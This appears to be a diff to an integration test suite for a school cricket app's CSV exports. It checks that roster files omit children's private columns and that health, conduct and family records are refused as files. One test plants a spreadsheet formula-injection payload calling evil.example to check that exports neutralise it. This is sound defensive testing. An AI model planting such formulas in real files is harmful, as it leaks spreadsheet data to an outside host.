@@ -118,19 +118,27 @@ try {
              "14 Ridge Road, Hilton", "1104075800085", "2011-04-07"]);
     const asOffice = await exportCsv("players", office);
     const asCoach  = await exportCsv("players", coach);
-    ok("the office, who holds player.pii.read, gets the address",
-       asOffice.includes("14 Ridge Road"));
-    ok("...and the identity number", asOffice.includes("1104075800085"));
+    // The screen still gives the office what player.pii.read allows...
+    const onScreen = await api("/api/read/players", { token: office });
+    ok("the office, who holds player.pii.read, reads the address on the screen",
+       (onScreen.body?.rows ?? []).some((r) => String(r.address ?? "").startsWith("14 Ridge Road")));
+    // ...and the FILE drops every masked column, for every reader alike: the
+    // roster as a bus list, not the office's record of a child.
+    ok("THE OFFICE'S FILE HAS NO ADDRESS IN IT", !asOffice.includes("14 Ridge Road"));
+    ok("...and no identity number", !asOffice.includes("1104075800085"));
+    ok("...and no birthday", !asOffice.includes("2011-04-07"));
+    const header = asOffice.replace(/^\uFEFF/, "").split(/\r?\n/)[0].split(",");
+    ok("...nor the masked columns' names in its header",
+       !["address", "guardian", "id_number", "born", "fitness", "hometown", "height", "weight"].some((c) => header.includes(c)));
     ok("THE COACH'S FILE HAS NO ADDRESS IN IT", !asCoach.includes("14 Ridge Road"));
     ok("...and no identity number", !asCoach.includes("1104075800085"));
     ok("...but does have the roster they may see", /Pillay|Botha/.test(asCoach));
-    // A module switched off closes the export too, because it closes the read.
-    await api("/api/admin/modules/injuries/suppress", { method: "POST", token: office,
-      body: { schoolId: HIL, hidden: true, reason: "CSV walk." } });
-    ok("a switched-off module refuses its export", (await exportRaw("injuries", medic)).status === 403);
-    await api("/api/admin/modules/injuries/suppress", { method: "POST", token: office,
-      body: { schoolId: HIL, hidden: false } });
-    ok("...and serves it again once back on", (await exportRaw("injuries", medic)).status === 200);
+    // A module's read is not a file at all: the training calendar is read on
+    // its screen, and refused as a file whether its module is on or off.
+    const cal = await exportRaw("training", coach);
+    ok("the training calendar does not leave as a file",
+       cal.status === 403 && (await cal.json().catch(() => null))?.error === "not_exported");
+    ok("...though the coach reads it on the screen", (await api("/api/read/training", { token: coach })).status === 200);
   }
 
   group("A restricted read is logged, whether it is a screen or a file");
@@ -145,10 +153,59 @@ try {
        (await q(`select resource from access_log order by occurred_at desc limit 1`))[0].resource === "players");
   }
 
+  group("The roster file is the roster keepers' (Kameel, 22 Oct)");
+  {
+    // player.roster.read or player.profile.manage at the school: the office
+    // and the coach hold one; a parent, a pupil, the scorer and the physio
+    // read the squad on the screen and get no file, refused before the read.
+    const scorer = await login("scorer@example.invalid");
+    const pupil  = await login("pillay@example.invalid");
+    const logged = async () => (await q(`select count(*)::int c from access_log where resource = 'players'`))[0].c;
+    const before = await logged();
+    for (const [who, tok] of [["a parent", parent], ["a pupil", pupil], ["the scorer, who keeps no roster", scorer],
+                              ["the physio, who keeps no roster", medic]]) {
+      const e = await exportRaw("players", tok);
+      const body = await e.json().catch(() => null);
+      ok(`${who} is refused the roster file`, e.status === 403 && body?.error === "not_exported");
+    }
+    ok("...before anything was read, so nothing was logged", (await logged()) === before);
+    ok("the scorer still reads the squad on the screen", (await api("/api/read/players", { token: scorer })).status === 200);
+    ok("the office and the coach still get theirs",
+       (await exportRaw("players", office)).status === 200 && (await exportRaw("players", coach)).status === 200);
+  }
+
+  group("A child's health, conduct, family and figures never leave as a file");
+  {
+    // packages/policy/src/exports.mjs: only the roster (without its masked
+    // columns) and the fixtures
+    // leave. Each of these is read on its screen by the reader asked here,
+    // and refused as a file, before anything is read.
+    const dso = await login("dso@example.invalid");
+    const logged = async () => (await q(`select count(*)::int c from access_log`))[0].c;
+    const before = await logged();
+    for (const [r, tok, who] of [["injuries", medic, "the medic"], ["injury_worklist", medic, "the medic"],
+                                 ["emergency_contacts", office, "the office"], ["child_links", office, "the office"],
+                                 ["users", office, "the office"], ["accounts", office, "the office"],
+                                 ["disciplinary_records", dso, "the DSO"], ["availability", coach, "the coach"],
+                                 ["career", coach, "the coach"], ["bowling_breaches", coach, "the coach"],
+                                 ["consents", parent, "a parent"], ["honours", coach, "the coach"]]) {
+      const e = await exportRaw(r, tok, r === "child_links" ? "?playerId=aaaaaaaa-0000-0000-0000-000000000005" : "");
+      const body = await e.json().catch(() => null);
+      ok(`${r} is refused as a file to ${who}`, e.status === 403 && body?.error === "not_exported");
+    }
+    ok("...refused before the read, so nothing was read to refuse it", (await logged()) === before);
+    ok("the fixtures still leave", (await exportRaw("matches", coach)).status === 200);
+    ok("...and the league table does not", (await exportRaw("league", coach)).status === 403);
+  }
+
   group("A cell is a program, and the file must be safe to open");
   {
     // Excel, Numbers and LibreOffice all evaluate a cell beginning = + - or @.
-    await q(`update player set hometown = $2 where id = $1`,
+    // In the name, because the roster file carries no masked column (the
+    // hometown this walk used to plant it in no longer leaves as a file).
+    const [{ full_name: realName }] = await q(`select full_name from player where id = $1`,
+                                              ["aaaaaaaa-0000-0000-0000-000000000005"]);
+    await q(`update player set full_name = $2 where id = $1`,
             ["aaaaaaaa-0000-0000-0000-000000000005",
              '=HYPERLINK("http://evil.example/?"&A1,"click")']);
     const csv = await exportCsv("players", office);
@@ -157,8 +214,8 @@ try {
     // apostrophe every spreadsheet reads as "this is text".
     ok("...neutralised with a leading apostrophe", /'=HYPERLINK/.test(csv));
     ok("...and it is not a live formula", !/(^|,)=HYPERLINK/m.test(csv));
-    await q(`update player set hometown = 'Hilton' where id = $1`,
-            ["aaaaaaaa-0000-0000-0000-000000000005"]);
+    await q(`update player set full_name = $2 where id = $1`,
+            ["aaaaaaaa-0000-0000-0000-000000000005", realName]);
   }
 
   group("A template is given, not documented");
@@ -502,7 +559,7 @@ try {
     // The scouting list: a family's consent, withdrawn at any time.
     ok("the scouting list does not leave as a file", (await exportRaw("scouting_candidates", scout)).status === 403);
 
-    // Nothing else moved: the roster and the training calendar still export.
+    // Nothing else moved: the roster still exports.
     ok("the office's roster still exports", (await exportRaw("players", office)).status === 200);
     ok("...and the coach's own", (await exportRaw("players", coach)).status === 200);
     await api("/api/admin/features/opposition", { method: "POST", token: platform,
